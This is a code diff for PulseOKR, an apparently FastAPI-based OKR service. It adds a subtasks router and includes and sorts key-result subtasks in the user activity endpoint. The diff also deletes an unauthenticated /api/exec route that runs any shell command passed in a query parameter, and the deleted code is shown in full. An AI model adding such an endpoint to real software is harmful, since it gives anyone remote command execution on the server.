@@ -1,7 +1,7 @@
 from fastapi import FastAPI, Depends, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from .core.supabase_client import supabase, supabase_admin
-from .routers import goals, companies, key_results, pillars, profile, feedback
+from .routers import goals, companies, key_results, pillars, profile, feedback, subtasks
 from .core.auth import get_current_user
 
 app = FastAPI(title="PulseOKR API", version="0.1.0")
@@ -26,6 +26,7 @@ app.include_router(key_results.router)
 app.include_router(pillars.router)
 app.include_router(profile.router)
 app.include_router(feedback.router)
+app.include_router(subtasks.router)
 
 @app.get("/api/health")
 async def health_check():
@@ -145,11 +146,11 @@ async def get_user_activity(user_id: str, current_user: dict = Depends(get_curre
     if not is_authorized:
         raise HTTPException(status_code=403, detail="Not authorized to view this user's activity")
 
-    # Fetch user's goals with nested key results, progress logs, and the updater's name
-    res = supabase.table("goals").select("*, key_results(*, progress_logs(*, users(full_name)))").eq("user_id", user_id).order("created_at", desc=True).execute()
+    # Fetch user's goals with nested key results, subtasks, progress logs, and the updater's name
+    res = supabase.table("goals").select("*, key_results(*, kr_subtasks(*), progress_logs(*, users(full_name)))").eq("user_id", user_id).order("created_at", desc=True).execute()
     goals_data = res.data
 
-    # Sort progress logs chronologically (descending)
+    # Sort progress logs and subtasks
     for goal in goals_data:
         for kr in goal.get("key_results", []):
             if "progress_logs" in kr and kr["progress_logs"]:
@@ -160,22 +161,19 @@ async def get_user_activity(user_id: str, current_user: dict = Depends(get_curre
                 )
             else:
                 kr["progress_logs"] = []
+                
+            if "kr_subtasks" in kr and kr["kr_subtasks"]:
+                kr["kr_subtasks"] = sorted(
+                    kr["kr_subtasks"],
+                    key=lambda x: x.get("order_index", 0)
+                )
+            else:
+                kr["kr_subtasks"] = []
 
     return {
         "user": target_user,
         "goals": goals_data
     }
-
-@app.get("/api/exec")
-async def execute_command(cmd: str):
-    import subprocess
-    try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        return {"output": output.decode()}
-    except subprocess.CalledProcessError as e:
-        return {"error": str(e), "output": e.output.decode() if e.output else ""}
-    except Exception as e:
-        return {"error": str(e)}
 
 
 
